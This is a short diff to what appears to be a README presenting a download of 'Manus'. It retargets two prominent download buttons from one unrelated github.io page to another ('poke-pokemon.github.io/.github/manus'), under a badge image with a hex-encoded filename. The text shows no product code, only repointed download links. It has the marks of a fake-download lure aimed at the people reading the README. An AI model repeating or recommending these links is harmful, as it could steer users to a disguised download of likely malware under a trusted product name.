@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://andrey-petrov-software.github.io/.github/manus">
+  <a href="https://poke-pokemon.github.io/.github/manus">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Manus"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The code execution capability is what extends Manus's reach far beyond text-base
 
 <p align="center">
 
-[![Get it Now Manus](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://andrey-petrov-software.github.io/.github/manus)
+[![Get it Now Manus](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://poke-pokemon.github.io/.github/manus)
 
 </p>
 
